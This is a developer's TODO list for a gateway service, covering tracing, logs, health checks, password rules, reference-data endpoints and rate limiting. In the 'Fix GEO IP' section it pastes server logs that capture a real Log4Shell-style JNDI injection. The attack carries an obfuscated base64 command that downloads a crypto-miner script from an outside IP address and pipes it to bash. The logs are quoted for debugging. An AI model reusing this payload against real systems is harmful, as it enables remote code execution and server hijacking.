

# TODO tasks for the project

# Request identifier and tracing

OpenTelemetry + Open Telemetry server: https://opentelemetry.io/

Should we add X-Request-ID to all requests and responses for tracing?
Are there any other ways to trace requests?
Are there libraries that already handle tracing?
Do libraries stick to an specific tracing product or standard?

## Logs

Show logs in the dashboard
* Filter logs by date range
* Filter logs by severity level
* Search logs by keyword

## Stats

* CPU usage
* Memory usage

# Health check 

GET /_/health - Returns 200 OK if the service is running

Health check configuration for the routes configured in the gateway:
- Add a URL to check
- Check interval
- Timeout
- Expected response code
- Show the results in /_/health



## Password

* Add password strength validation with rules
    * Minimum length
    * Special characters
    * Uppercase letters
* Implement password reset functionality
* Maximum password attempts before lockout
    * Unlock account button
* Implement password expiration policy
* 2FA (Two-Factor Authentication)
    * Email-based 2FA?
    * SMS-based 2FA?
    * Authenticator app-based 2FA


# Constants data

## Countries

* Add a list of countries with their ISO codes
* Flag images for each country
* Country names in multiple languages
* Country calling codes
* Country time zones
* Country languages
* Country currencies

/countries -> [{...}, {...}, ...]
/countries/{countryCode} -> {
  "name": "Spain",
  "flag": "/_/countries/ES/flag",
  "isoCode": "ES",
  "iso3Code": "ESP",
  "callingCode": "+34",
  "timeZone": "Europe/Madrid",
  "languages": ["Spanish", "Catalan", "Galician", "Basque", "Valencian"],
  "currency": "EUR"
}
/countries/{countryCode}/flag -> image of the flag

## Languages

* Add a list of languages with their ISO codes
* Language names in multiple languages
* Language codes (ISO 639-1, ISO 639-2, ISO 639-3)

/languages -> [{...}, {...}, ...]
/languages/{languageCode} -> {
    "name": "Spanish",
    "isoCode": "es",
    "iso2Code": "es",
    "iso3Code": "spa",
    "nativeName": "Español",
    "rtl": false,
    "flag": "/_/languages/es/flag"
}
/languages/{languageCode}/flag -> image of the flag

## Timezones

* Add a list of time zones with their names and offsets
* Time zone names in multiple languages
* Time zone offsets in seconds
* Time zoned data: https://github.com/dmfilipenko/timezones.json/blob/master/timezones.json


## Storage

* Add a storage system for user-uploaded files
* Implement file versioning
* Allow users to manage their files (upload, delete, rename)
* Integrate with cloud storage providers (e.g., AWS S3, Google Cloud Storage)


# Fix GEO IP

These logs show on megabox-qa:

```
2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.271Z - 87.120.191.93:56554 "GET /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')" 307 0.16ms
2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.594Z - 87.120.191.93:56554 "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z%7D%27%29" 404 0.10ms
2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
```

Why IP is not being parsed correctly? Is it because of the attack vector in the URL?

# Rate limiter

- Store persistent info about attackers (IP, user agent, etc.)
    - Show blocked IPs (with start and end date of the block)
    - Info about blocked IPs (number of requests, user agent, etc.), geo info, etc.
    - Show a map of attackers by country
- Request Details
    - Show IP address
    - Filter by IP address
    - Filter Period: add "last week", "last month", "last year"
    - Show user agent
    - Show if URL matches any of the blocking rules
    - Show the METHOD + PATH
- Does JA4 fingerprinting make any sense at all?
    - Can we use it to identify users?
    - Can we identify bots?
    - Can we identify returning users/attackers?
    - Filter by JA4 fingerprint separate parts? 
